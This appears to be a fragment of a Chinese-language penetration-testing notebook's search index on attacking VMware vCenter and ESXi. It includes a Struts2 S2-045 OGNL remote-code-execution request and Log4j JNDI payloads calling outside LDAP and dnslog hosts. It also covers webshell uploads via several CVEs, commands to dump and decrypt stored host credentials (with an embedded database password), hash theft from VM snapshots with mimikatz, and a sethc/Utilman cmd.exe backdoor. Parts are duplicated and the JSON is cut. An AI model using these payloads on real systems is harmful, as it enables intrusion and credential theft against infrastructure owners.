(6.1.7601.23418 / 2016-04-09) Win2008SP1x64 - A Profile for Windows 2008 SP1 x64 Win2008SP1x86 - A Profile for Windows 2008 SP1 x86 Win2008SP2x64 - A Profile for Windows 2008 SP2 x64 Win2008SP2x86 - A Profile for Windows 2008 SP2 x86 Win2012R2x64 - A Profile for Windows Server 2012 R2 x64 Win2012R2x64_18340 - A Profile for Windows Server 2012 R2 x64 (6.3.9600.18340 / 2016-05-13) Win2012x64 - A Profile for Windows Server 2012 x64 Win2016x64_14393 - A Profile for Windows Server 2016 x64 (10.0.14393.0 / 2016-07-16) Win7SP0x64 - A Profile for Windows 7 SP0 x64 Win7SP0x86 - A Profile for Windows 7 SP0 x86 Win7SP1x64 - A Profile for Windows 7 SP1 x64 Win7SP1x64_23418 - A Profile for Windows 7 SP1 x64 (6.1.7601.23418 / 2016-04-09) Win7SP1x86 - A Profile for Windows 7 SP1 x86 Win7SP1x86_23418 - A Profile for Windows 7 SP1 x86 (6.1.7601.23418 / 2016-04-09) Win81U1x64 - A Profile for Windows 8.1 Update 1 x64 Win81U1x86 - A Profile for Windows 8.1 Update 1 x86 Win8SP0x64 - A Profile for Windows 8 x64 Win8SP0x86 - A Profile for Windows 8 x86 Win8SP1x64 - A Profile for Windows 8.1 x64 Win8SP1x64_18340 - A Profile for Windows 8.1 x64 (6.3.9600.18340 / 2016-05-13) Win8SP1x86 - A Profile for Windows 8.1 x86 WinXPSP1x64 - A Profile for Windows XP SP1 x64 WinXPSP2x64 - A Profile for Windows XP SP2 x64 WinXPSP2x86 - A Profile for Windows XP SP2 x86 WinXPSP3x86 - A Profile for Windows XP SP3 x86 \u6302\u8f7dkon-boot\u7ed5\u8fc7\u9a8c\u8bc1 2.7\u7248\u672c\u53ea\u9002\u7528win7\u53ca\u4ee5\u4e0b \u5728\u865a\u62df\u673a\u4e0a\u6302PE\u7cfb\u7edf \u8fd9\u79cd\u64cd\u4f5c\u8ddf\u91cd\u88c5\u7cfb\u7edf\u4e00\u6837\uff0c\u6302\u4e00\u4e2aPE\uff0c\u4ecePE\u542f\u52a8\u3002 \u6ce8\u610f\u865a\u62df\u673a\u7684\u7cfb\u7edf\uff0c\u786e\u5b9a\u662fUEFI\u542f\u52a8\u8fd8\u662fBIOS\u542f\u52a8\uff0c\u4e00\u822cwin8\u4ee5\u4e0a\u7684\u7cfb\u7edf\u90fd\u662fUEFI\u542f\u52a8\uff0c\u6ce8\u610f\u8c03\u6210ISO\u5bf9\u5e94\u7684\u542f\u52a8\u65b9\u5f0f\u3002 \u8fdb\u5165PE\u540e\u53ef\u4ee5\u968f\u5fc3\u6240\u6b32\u4e86\uff0cPE\u7cfb\u7edf\u63d0\u4f9b\u4e86\u4e00\u4e2a\u76f4\u63a5\u4fee\u6539\u7528\u6237\u5bc6\u7801\u7684\u5de5\u5177\u3002 \u5982\u679c\u8981\u83b7\u53d6\u5f53\u524d\u7528\u6237\u7684\u5bc6\u7801\uff0c\u9700\u8981\u628a\u5de5\u5177\u5f04\u4e0a\u53bb\uff0c\u4f46\u662f\u865a\u62df\u673a\u65e0\u6cd5\u8fdb\u884c\u6587\u4ef6\u4ea4\u4e92\uff0c\u6240\u4ee5\u53ea\u80fd\u5c06\u5de5\u5177\u62d6\u5230PE\u955c\u50cf\u91cc\u53bb\uff0c\u8ba9\u4ed6\u81ea\u5df1\u52a0\u8f7d\u3002 \u7531\u4e8e\u4e00\u5f00\u59cb\u7528\u7684PE\u7cfb\u7edf\u662f32\u4f4d\u7684\uff0c\u5de5\u5177\u5404\u79cd\u90fd\u7528\u4e0d\u4e86\uff0c\u540e\u9762\u53c8\u627e\u4e86\u4e00\u4e2a64\u4f4d\u7684PE\u7cfb\u7edf\uff0c\u7136\u540e\u7528\u4e4b\u524d\u7684\u5f15\u5bfc\u7a0b\u5e8f\u6210\u529f\u52a0\u8f7d64\u4f4dPE\u3002 \u627e\u5230PE\u7cfb\u7edf\u4e2d\u7684WIM\u6587\u4ef6\uff0c\u7528\u538b\u7f29\u5305\u6253\u5f00\uff0c\u8981\u4ec0\u4e48\u5de5\u5177\u76f4\u63a5\u5f80\u91cc\u62d6\u3002 \u968f\u540e\u7528UltraISO\u91cd\u65b0\u6253\u5305\u6210ISO \u8fdb\u5165PE\u7cfb\u7edf\u540e\u628a\u5de5\u5177\u62d6\u51fa\u6765\u76f4\u63a5\u7528\uff0c\u9700\u8981\u6ce8\u610f\u7684\u662f\u8fd0\u884c\u5de5\u5177\u4f1a\u62a5\u7f3a\u5c11dll\uff0c\u8fd9\u4e2a\u65f6\u5019\u9700\u8981\u628acmd\u76ee\u5f55\u5207\u6362\u5230system32\u4e0b\uff0c\u6216\u8005\u5c06C\u76d8system32\u76ee\u5f55\u52a0\u5230PE\u7cfb\u7edf\u7684\u73af\u5883\u53d8\u91cf\u4e0b\u3002 \u968f\u540e\u5bfc\u51faSAM\u548cSYSTEM\u76f4\u63a5\u63d0\u53d6hash \u6700\u597d\u76f4\u63a5\u4f7f\u7528system32\\config\u76ee\u5f55\u4e0b\u7684SAM\u548csystem\uff0c\u4fe1\u606f\u6bd4\u8f83\u5b8c\u5168\uff0c\u8fd9\u91cc\u6ca1\u6709\u63d0\u5230NTLM\uff0c\u4e0d\u77e5\u9053\u662f\u4ec0\u4e48\u60c5\u51b5 \u8fd8\u53ef\u4ee5\u52a0\u4e2a\u540e\u95e8\uff0c\u4e3a\u6240\u6b32\u4e3a move c:\\windows\\system32\\Magnify.exe c:\\windows\\system32\\Magnify1.exe move C:\\windows\\system32\\Utilman.exe C:\\windows\\system32\\Utilman1.exe move C:\\windows\\system32\\osk.exe C:\\windows\\system32\\osk1.exe move C:\\windows\\system32\\sethc.exe C:\\windows\\system32\\sethc1.exe copy c:\\windows\\system32\\cmd.exe c:\\windows\\system32\\Magnify.exe copy C:\\windows\\system32\\cmd.exe C:\\windows\\system32\\Utilman.exe copy C:\\windows\\system32\\cmd.exe C:\\windows\\system32\\osk.exe copy C:\\windows\\system32\\cmd.exe C:\\windows\\system32\\sethc.exe C:\\ProgramData\\VMware\\vCenterServer\\data\\vmdird\\data.mdb /storage/db/vmware-vmdir/data.mdb","title":"Vcenter\u653b\u51fb\u9762"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Vcenter%E6%94%BB%E5%87%BB%E9%9D%A2/#_1","text":"","title":"\u5b89\u88c5"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Vcenter%E6%94%BB%E5%87%BB%E9%9D%A2/#esxi","text":"\u9700\u8981\u5728\u4e00\u4e2a\u672a\u5b89\u88c5\u7cfb\u7edf\u7684\u7535\u8111\uff08\u865a\u62df\u673a\uff09\u4e0a\u5b89\u88c5\uff0c\u5b89\u88c5\u8fc7\u7a0b\u5c31\u662f\u540c\u610f\u540c\u610f\uff0c\u6700\u540e\u8f93\u5165root\u5bc6\u7801\uff0c\u6700\u540e\u767b\u5f55web\u4f7f\u7528web\u754c\u9762\u8fdb\u884c\u7ba1\u7406\u3002 \u5b89\u88c5\u5b8c\u6210\u5982\u56fe\u6240\u793a \u7ba1\u7406\u754c\u9762\u5982\u56fe\u6240\u793a","title":"ESXI\u5b89\u88c5"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Vcenter%E6%94%BB%E5%87%BB%E9%9D%A2/#vcenter","text":"vCenter\u662f\u7528\u6765\u7ba1\u63a7\u591a\u4e2aESXI\u7684\uff0c\u5355\u4e2aESXI\u6ca1\u5fc5\u8981\u4f7f\u7528vCenter\u3002 \u5e38\u89c4\u5b89\u88c5\u65b9\u5f0f\u662f\u9700\u8981\u8fde\u63a5\u5230ESXI\u5b89\u88c5\uff0c\u76f8\u5f53\u4e8e\u5728ESXI\u5b89\u88c5\u4e86\u4e00\u53f0vCenter\u7684\u865a\u62df\u673a\u3002\u76f4\u63a5\u4e0b\u4e00\u6b65\u4e0b\u4e00\u6b65\u5c31\u884c\u4e86\u3002\u7b2c\u4e00\u9636\u6bb5\u4e2d\u7684root\u5bc6\u7801\u662fvCenter\u865a\u62df\u673a\u7684\u5bc6\u7801\uff0c\u7b2c\u4e8c\u9636\u6bb5SSO\u7684\u5bc6\u7801\u662fweb\u7684\u767b\u5f55\u5bc6\u7801\u3002 \u6bd4\u8f83\u7279\u6b8a\u7684\u5b89\u88c5\u65b9\u5f0f\u662f\u5c06vCenter\u4e2d\u7684ova\u6587\u4ef6\u76f4\u63a5\u5bfc\u5165\u5230\u865a\u62df\u673a\u4e2d\uff0c\u8fd9\u91cc\u53ef\u4ee5\u4e0d\u7528\u8fde\u4e0aESXI\uff0c\u9700\u8981\u914d\u7f6e\u4e00\u4e0broot\u5bc6\u7801\u3002 \u5bfc\u5165\u5b8c\u6210\u540e\u8bbf\u95ee5480\u7aef\u53e3\u8fdb\u884c\u914d\u7f6e\uff0c\u914d\u7f6e\u5b8c\u6210\u540e\u53ef\u4ee5\u76f4\u63a5\u767b\u5f55\u3002","title":"vCenter\u5b89\u88c5"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Vcenter%E6%94%BB%E5%87%BB%E9%9D%A2/#_2","text":"POST /sdk HTTP/1.1 Host: 192.168.25.137 Cookie: XSRF-TOKEN=LUkPdkLESf6o7foIvzQgQpeGEEVV5mEb; appliance-ui-sessionid=M2QzYzgxZjYtZGQzNy00MmRjLTk4MzYtZjkwNTRlMjRmZGNi; JSESSIONID=AE593F8A3615F7C04EA53A1F13F77F58 Cache-Control: max-age=0 Content-Length: 373 <env:Envelope xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:env=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"> <env:Body> <RetrieveServiceContent xmlns=\"urn:vim25\"> <_this type=\"ServiceInstance\">ServiceInstance</_this> </RetrieveServiceContent> </env:Body> </env:Envelope> \u8be6\u7ec6\u7248\u672c\u53f7\u53ef\u5728\u5b98\u7f51\u67e5\u8be2 https://kb.vmware.com/s/article/2143838?lang=zh_CN","title":"\u67e5\u770b\u7248\u672c"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Vcenter%E6%94%BB%E5%87%BB%E9%9D%A2/#esxi_1","text":"esxcli network ip interface list esxcli network ip interface ipv4 get -i vmk<X> esxcli network ip interface ipv6 get -n vmk<X> esxcli network ip interface ipv6 address list You can retrieve information about DNS with the esxcli network ip dns command in the following two namespaces: esxcli network ip dns search esxcli network ip dns server For information corresponding to the Linux netstat command, use the following ESXCLI command. esxcli network ip connection list","title":"ESXI\u64cd\u4f5c"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Vcenter%E6%94%BB%E5%87%BB%E9%9D%A2/#_3","text":"","title":"\u6f0f\u6d1e"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Vcenter%E6%94%BB%E5%87%BB%E9%9D%A2/#_4","text":"python2 vCenterExploit.py -s -u https://190.0.0.1:2443 python2 vCenterExploit.py -u https://190.0.0.2:3443 -o unix -c \"id\" python2 vCenterExploit.py -u https://190.0.0.2:2443 -log4j '${jndi:ldap://192.68.25.1:1389/${sys:java.version}}' python2 vCenterExploit.py -u https://190.0.0.2:2443 -shell -o unix -f shell.jsp","title":"\u4e00\u952e\u5316\u653b\u51fb"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Vcenter%E6%94%BB%E5%87%BB%E9%9D%A2/#s2-045","text":"GET /statsreport/ HTTP/1.1 Host: vcenter:443 Content-Type: %{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='id').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())} Connection: close Content-Length: 0","title":"S2-045"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Vcenter%E6%94%BB%E5%87%BB%E9%9D%A2/#cve-2021-21972-","text":"\u6f0f\u6d1e\u89e6\u53d1\u70b9 /ui/vropspluginui/rest/services/uploadova \u4e0a\u4f20\u7684\u7269\u7406\u8def\u5f84\u662f /usr/lib/vmware-vsphere-ui/server/work/deployer/s/global/42/0/h5ngc.war/resources/ \u8def\u5f84\u4e0d\u4e00\u5b9a\u901a\u7528\uff0c\u9700\u8981\u679a\u4e3e\u3002 web\u8bbf\u95ee\u8def\u5f84\u662f/ui/resources/xx.jsp \u4f7f\u7528\u811a\u672c\u4e0a\u4f20\u76f4\u63a5\u679a\u4e3e\u8def\u5f84\uff0c\u83b7\u53d6\u7684\u662fui\u6743\u9650\uff0c\u9700\u8981\u63d0\u6743\u5230root\u3002","title":"CVE-2021-21972-\u6587\u4ef6\u4e0a\u4f20"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Vcenter%E6%94%BB%E5%87%BB%E9%9D%A2/#cve-2021-21985-jndi-rce","text":"jndi\u9700\u8981bypass jdk\u7684\u9ad8\u7248\u672c\uff0c\u76f4\u63a5\u811a\u672c\u6253\u3002 \u83b7\u53d6\u7684\u662fui\u6743\u9650\uff0c\u9700\u8981\u63d0\u6743\u5230root","title":"CVE-2021-21985-JNDI-RCE"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Vcenter%E6%94%BB%E5%87%BB%E9%9D%A2/#cve-2021-22005-","text":"\u811a\u672c\u76f4\u63a5\u6253\uff0c\u83b7\u53d6\u7684\u662froot\u6743\u9650\u3002\u6587\u4ef6\u4e0a\u4f20\u5230\u4e86 /usr/lib/vmware-sso/vmware-sts/webapps/ROOT/ \u8fd9\u4e2a\u8def\u5f84\u9700\u8981root\u6743\u9650\u624d\u53ef\u64cd\u4f5c\u3002 web\u8bbf\u95ee\u8def\u5f84\u662f/idm/..;/xx.jsp","title":"CVE-2021-22005-\u6587\u4ef6\u4e0a\u4f20"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Vcenter%E6%94%BB%E5%87%BB%E9%9D%A2/#log4j2","text":"curl --insecure -vv -H \"X-Forwarded-For: \\\\${jndi:ldap://vcentertest.fccszs.dnslog.cn:1389/lol}\" \"https://10.100.100.5/websso/SAML2/SSO/vcenter.lab?SAMLRequest=\"","title":"Log4j2"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Vcenter%E6%94%BB%E5%87%BB%E9%9D%A2/#_5","text":"","title":"\u672c\u5730\u63d0\u6743"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Vcenter%E6%94%BB%E5%87%BB%E9%9D%A2/#cve-2021-3156","text":"\u539f\u7248 exploit_defaults_mailer.py.yuanban \u4fee\u6539\u7248 vCenter_privilege_escalation.py \uff0c\u76f4\u63a5\u5728 /usr/lib/vmware-sso/vmware-sts/webapps/openidconnect/ \u5199\u4e00\u4e2awebshell\u3002\u8bbf\u95ee\u8def\u5f84\u662f http://xxxx/vmware-sts/openidconnect/xxx.jsp","title":"CVE-2021-3156"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Vcenter%E6%94%BB%E5%87%BB%E9%9D%A2/#web","text":"","title":"\u8fdbweb\u540e\u53f0"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Vcenter%E6%94%BB%E5%87%BB%E9%9D%A2/#web_1","text":"\u83b7\u53d6root\u6743\u9650\u540e\u4f7f\u7528vmafd-cli\u67e5\u8be2\u57df\u540d vsphere.local \u57df\u7528\u6237\u5728 vCenter 5.5 \u7248\u672c\u4e0a\u7684\u5bc6\u7801\u7a0d\u6709\u53d8\u5316\uff0c\u9700\u8981\u63d0\u4f9b cn=administrator.cn=users.dc=vsphere.dc=local \u7684\u683c\u5f0f\u7684\u5e10\u6237 DN \u800c\u4e0d\u662f\u5e10\u6237 UPN\u3002 \u65e7\u7248\u672c\u7684 vCenter 5.1 \uff0c\u5219\u53ef\u4ee5\u8f6c\u5230 /usr/lib/vmware-sso/utils \u6587\u4ef6\u5939\uff0c\u8fd0\u884c\u547d\u4ee4 ./rsutil reset-admin-password \uff0c\u8f93\u5165\u4e3b\u5bc6\u7801\uff08\u8fd9\u662f root \u5bc6\u7801\uff09\uff0c\u7136\u540e\u8f93\u5165\u8981\u91cd\u7f6e\u7684 SSO \u7ba1\u7406\u5458\u540d\u79f0\uff0c\u4f8b\u5982\uff1a admin \u3002\u51fa\u73b0\u63d0\u793a\u65f6\u952e\u5165\u65b0\u5bc6\u7801\uff0c\u5b83\u5c06\u663e\u793a \"\u5bc6\u7801\u91cd\u7f6e\u6210\u529f\" \u6d88\u606f /usr/lib/vmware-vmafd/bin/vmafd-cli get-domain-name --server-name localhost \u4f7f\u7528 /usr/lib/vmware-vmdir/bin/vdcadmintool \u91cd\u7f6e\u5bc6\u7801 Windows \u7248\u672c\u7684vCenter\u4e0a\uff0c\u4f7f\u7528\u547d\u4ee4\u884c\u5de5\u5177\u8fdb\u5165\u5230 %VMWARE_CIS_HOME%\\vmdird\\ \u76ee\u5f55\u4e0b\uff0c\u6267\u884c vdcadmintool.exe \u7a0b\u5e8f\u3002 linux \u4e00\u53e5\u8bdd\u91cd\u7f6e\uff1a **(echo \"3\"&&sleep 1&&echo \"administrator@vsphere.local\") | /usr/lib/vmware-vmdir/bin/vdcadmintool** Windows\u548cLinux\u90fd\u53ef\u4ee5\u4f7f\u7528python\u811a\u672c\u76f4\u63a5\u91cd\u7f6e vCenterResetPassword.py","title":"\u91cd\u7f6eweb\u540e\u53f0\u5bc6\u7801"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Vcenter%E6%94%BB%E5%87%BB%E9%9D%A2/#samlcookie","text":"https://github.com/horizon3ai/vcenter_saml_login python-ldap\u6709\u70b9\u641e \u5148\u5b89\u88c5 apt-get install build-essential python3-dev python2.7-dev \\ libldap2-dev libsasl2-dev slapd ldap-utils tox \\ lcov valgrind \u518d\u5b89\u88c5 pip install python-ldap \u627e\u5230data.mdb Linux: Windows \u8fd0\u884c\u83b7\u5f97cookie python3 vcenter_saml_login.py -p data.mdb -t 192.168.25.137","title":"saml\u8bc1\u4e66\u63d0\u53d6\u53ef\u767b\u5f55\u7684cookie"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Vcenter%E6%94%BB%E5%87%BB%E9%9D%A2/#ldap","text":"\u9996\u5148\u9700\u8981\u83b7\u53d6ldap\u7ba1\u7406\u5458\u7684\u5bc6\u7801\u624d\u80fd\u591f\u6dfb\u52a0\u7528\u6237 \u5bc6\u7801\u4fdd\u5b58\u6587\u4ef6\u4f4d\u7f6e # Linux /var/lib/likewise/db/active.db /var/lib/likewise/db/registry.db /storage/service-state/likewise/registry.db # Windows reg query \"HKLM\\SYSTEM\\CurrentControlSet\\services\\VMwareDirectoryService\" /v dcAccount reg query \"HKLM\\SYSTEM\\CurrentControlSet\\services\\VMwareDirectoryService\" /v dcAccountDN reg query \"HKLM\\SYSTEM\\CurrentControlSet\\services\\VMwareDirectoryService\" /v dcAccountPassword \u76f4\u63a5\u67e5\u8be2ldap\u7ba1\u7406\u5458\u5bc6\u7801 /opt/likewise/bin/lwregshell list_values [HKEY_THIS_MACHINE\\\\services\\\\vmdir] vCenterLDAPManage_linux_python3.py \u53ef\u4ee5\u5728\u672c\u5730\u76f4\u63a5\u52a0\u7528\u6237 vCenter_addUser_remotely_python3.py \u53ef\u4ee5\u8fdc\u7a0b\u52a0\u7528\u6237\uff0cLinux\u9700\u8981\u4e0b\u8f7ddb\u6587\u4ef6\uff0cWindows\u9700\u8981\u6307\u5b9a\u5bc6\u7801","title":"ldap\u7ba1\u7406\u7528\u6237"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Vcenter%E6%94%BB%E5%87%BB%E9%9D%A2/#_6","text":"","title":"\u83b7\u53d6\u865a\u62df\u673a\u6743\u9650"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Vcenter%E6%94%BB%E5%87%BB%E9%9D%A2/#hash","text":"\u5217\u51fa\u865a\u62df\u673a SharpSphere.exe list --url https://192.168.25.134/sdk --username administrator@test.com --password \"!QAZ2wsx\" \u4e0b\u8f7d\u6307\u5b9a\u865a\u62df\u673a\u7684\u5feb\u7167\uff0c\u5982\u4e0d\u5b58\u5728\u5feb\u7167\u9700\u8981\u521b\u5efa \u521b\u5efa\u53ef\u4ee5web\u540e\u53f0\u521b\u5efa\uff0c\u4e5f\u53ef\u4ee5\u7528\u6b64\u5de5\u5177\u521b\u5efa\uff0c\u5728\u4e0b\u8f7d\u540e\u6307\u5b9a --snapshot \u4ee3\u8868\u5148\u521b\u5efa\u4e00\u4e2a\u5feb\u7167\u7136\u540e\u4e0b\u8f7d\u3002 SharpSphere.exe dump --url https://192.168.25.134/sdk --username administrator@test.com --password \"!QAZ2wsx\" --targetvm win10 --destination C:\\Users\\admin\\Desktop\\vcneter \u4e0b\u8f7d\u540e\u4f1a\u751f\u6210\u4e00\u4e2a\u5927\u6587\u4ef6\u548c\u4e00\u4e2a\u5c0f\u6587\u4ef6\uff0c\u4e00\u4e2a4G\u7684\u548c\u4e00\u4e2a3.5M\u7684\uff0c\u5927\u6587\u4ef6\u5927\u5c0f\u8ddf\u5185\u5b58\u6709\u5173\u3002 \u4f7f\u7528 vmss2corex \u6765\u63d0\u53d6 win8\u53ca\u4ee5\u4e0a\u7684\u7cfb\u7edf\u9700\u8981\u52a0 -W8 \u53c2\u6570\uff0c\u5176\u4ed6\u76f4\u63a5 -W \u5148\u6307\u5b9a\u5c0f\u6587\u4ef6\uff0c\u518d\u6307\u5b9a\u5927\u6587\u4ef6 vmss2core-sb-8456865.exe -W8 zs5k2ypj.uhv 1lagz1jn.xae \u5c06\u751f\u6210\u7684dmp\u62d6\u5230windbg\u4e2d\u8c03\u8bd5\u3002 windbg\u6700\u597d\u7528 sdk \u5de5\u5177\u5b89\u88c5\uff0c\u4e0d\u7136\u4f1a\u6709\u95ee\u9898\u3002 \u52a0\u8f7dmimikatz .load C:\\mimilib.dll \u5b9a\u4f4dlsass.exe\u8fdb\u7a0b\u5730\u5740\uff0c\u8fd0\u884cmimikatz 0: kd> !process 0 0 lsass.exe Unable to get program counter PROCESS ffffb408bbedb080 SessionId: 0 Cid: 0260 Peb: 539cc78000 ParentCid: 01d0 DirBase: 11b652000 ObjectTable: ffff860f79142d40 HandleCount: 1135. Image: lsass.exe 0: kd> .process /r /p ffffb408bbedb080 Implicit process is now ffffb408`bbedb080 Loading User Symbols ................................................................ .................... 0: kd> !mimikatz \u6216\u8005\u4e0b\u8f7d\u597d\u5feb\u7167vmem\u6587\u4ef6\u540e\uff0c\u4f7f\u7528volatility\u63d0\u53d6\u3002 volatility_2.6_win64_standalone.exe -f xxx.vmem --profile=\u7cfb\u7edf\u67b6\u6784 lsadump","title":"\u4ece\u5feb\u7167\u63d0\u53d6\u865a\u62df\u673a\u7684hash"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Vcenter%E6%94%BB%E5%87%BB%E9%9D%A2/#esxihash","text":"\u539f\u5219\u4e0a\u8fd8\u662f\u5229\u7528\u5feb\u7167\u63d0\u53d6\uff0c\u53ea\u4e0d\u8fc7\u662f\u5728\u672c\u5730\u76f4\u63a5\u63d0\u53d6\uff0c\u4e0d\u7528\u4e0b\u8f7d\u5feb\u7167\u3002 \u5047\u8bbe\u5f53\u524d\u6709vCenter\u7684\u6743\u9650\uff0c\u4f46\u662f\u5feb\u7167\u5b58\u5728ESXI\u4e0a\u9762\uff0c\u9700\u8981\u83b7\u53d6ESXI\u7684\u6743\u9650\u5e76\u4e14ESXI\u5f00\u542f\u4e86SSH\u670d\u52a1\u3002 \u5982\u679cESXI\u6ca1\u6709\u5f00\u542fssh\uff0c\u53ef\u4ee5\u5728vCenter\u4e2d\u5f00\u542f\u3002 postgresql\u6570\u636e\u5e93\u914d\u7f6e\u6587\u4ef6\uff1a C:\\ProgramData\\VMware\\vCenterServer\\cfg\\vmware-vpx /etc/vmware-vpx/vcdb.properties psql -h localhost -d VCDB -U vc \u67e5\u8be2\u865a\u62df\u673a SELECT id,datacenter_id,file_name,guest_os,ip_address,config FROM vc.vpx_vm; \u67e5\u8be2ESXI\u7528\u6237\u5bc6\u7801 SELECT name,username,password,password_last_upd_dt FROM vc.vpxv_hosts; \u4e00\u952e\u67e5\u8be2\u5bfc\u51favpsuser\u7528\u6237\u5bc6\u7801 psql -h 127.0.0.1 -p 5432 -U vc -w HKJrm8yP2)aDWptU -d VCDB -c \"select ip_address,user_name,password from vpx_host;\" > password.enc \u89e3\u5bc6vpxuser\u5bc6\u7801\uff0c\u5982\u679c\u6709root\u5c31\u53ef\u4ee5\u76f4\u63a5\u767b\u5f55root # Windows C:\\ProgramData\\VMware\\vCenterServer\\cfg\\vmware-vpx\\ssl\\symkey.dat # Linux /etc/vmware-vpx/ssl/symkey.dat \u7ed9\u865a\u62df\u673a\u6253\u597d\u5feb\u7167\u540e\uff0c\u7528volatility\u8bfb\u53d6\u5185\u5b58\u5feb\u7167 ./volatility -f /vmfs/volumes/620b3190-c2d721da-84e5-000c29395ece/win10/win10-Snapshot1.vmem --profile=win1 0x64 hashdump \u6ce8\u610fprofile\u53c2\u6570\u5bf9\u5e94\u7684\u5e73\u53f0 Profiles -------- VistaSP0x64 - A Profile for Windows Vista SP0 x64 VistaSP0x86 - A Profile for Windows Vista SP0 x86 VistaSP1x64 - A Profile for Windows Vista SP1 x64 VistaSP1x86 - A Profile for Windows Vista SP1 x86 VistaSP2x64 - A Profile for Windows Vista SP2 x64 VistaSP2x86 - A Profile for Windows Vista SP2 x86 Win10x64 - A Profile for Windows 10 x64 Win10x64_10586 - A Profile for Windows 10 x64 (10.0.10586.306 / 2016-04-23) Win10x64_14393 - A Profile for Windows 10 x64 (10.0.14393.0 / 2016-07-16) Win10x86 - A Profile for Windows 10 x86 Win10x86_10586 - A Profile for Windows 10 x86 (10.0.10586.420 / 2016-05-28) Win10x86_14393 - A Profile for Windows 10 x86 (10.0.14393.0 / 2016-07-16) Win2003SP0x86 - A Profile for Windows 2003 SP0 x86 Win2003SP1x64 - A Profile for Windows 2003 SP1 x64 Win2003SP1x86 - A Profile for Windows 2003 SP1 x86 Win2003SP2x64 - A Profile for Windows 2003 SP2 x64 Win2003SP2x86 - A Profile for Windows 2003 SP2 x86 Win2008R2SP0x64 - A Profile for Windows 2008 R2 SP0 x64 Win2008R2SP1x64 - A Profile for Windows 2008 R2 SP1 x64 Win2008R2SP1x64_23418 - A Profile for Windows 2008 R2 SP1 x64 (6.1.7601.23418 / 2016-04-09) Win2008SP1x64 - A Profile for Windows 2008 SP1 x64 Win2008SP1x86 - A Profile for Windows 2008 SP1 x86 Win2008SP2x64 - A Profile for Windows 2008 SP2 x64 Win2008SP2x86 - A Profile for Windows 2008 SP2 x86 Win2012R2x64 - A Profile for Windows Server 2012 R2 x64 Win2012R2x64_18340 - A Profile for Windows Server 2012 R2 x64 (6.3.9600.18340 / 2016-05-13) Win2012x64 - A Profile for Windows Server 2012 x64 Win2016x64_14393 - A Profile for Windows Server 2016 x64 (10.0.14393.0 / 2016-07-16) Win7SP0x64 - A Profile for Windows 7 SP0 x64 Win7SP0x86 - A Profile for Windows 7 SP0 x86 Win7SP1x64 - A Profile for Windows 7 SP1 x64 Win7SP1x64_23418 - A Profile for Windows 7 SP1 x64 (6.1.7601.23418 / 2016-04-09) Win7SP1x86 - A Profile for Windows 7 SP1 x86 Win7SP1x86_23418 - A Profile for Windows 7 SP1 x86 (6.1.7601.23418 / 2016-04-09) Win81U1x64 - A Profile for Windows 8.1 Update 1 x64 Win81U1x86 - A Profile for Windows 8.1 Update 1 x86 Win8SP0x64 - A Profile for Windows 8 x64 Win8SP0x86 - A Profile for Windows 8 x86 Win8SP1x64 - A Profile for Windows 8.1 x64 Win8SP1x64_18340 - A Profile for Windows 8.1 x64 (6.3.9600.18340 / 2016-05-13) Win8SP1x86 - A Profile for Windows 8.1 x86 WinXPSP1x64 - A Profile for Windows XP SP1 x64 WinXPSP2x64 - A Profile for Windows XP SP2 x64 WinXPSP2x86 - A Profile for Windows XP SP2 x86 WinXPSP3x86 - A Profile for Windows XP SP3 x86","title":"\u5728ESXI\u672c\u5730\u63d0\u53d6hash"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Vcenter%E6%94%BB%E5%87%BB%E9%9D%A2/#kon-boot","text":"2.7\u7248\u672c\u53ea\u9002\u7528win7\u53ca\u4ee5\u4e0b","title":"\u6302\u8f7dkon-boot\u7ed5\u8fc7\u9a8c\u8bc1"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Vcenter%E6%94%BB%E5%87%BB%E9%9D%A2/#pe","text":"\u8fd9\u79cd\u64cd\u4f5c\u8ddf\u91cd\u88c5\u7cfb\u7edf\u4e00\u6837\uff0c\u6302\u4e00\u4e2aPE\uff0c\u4ecePE\u542f\u52a8\u3002 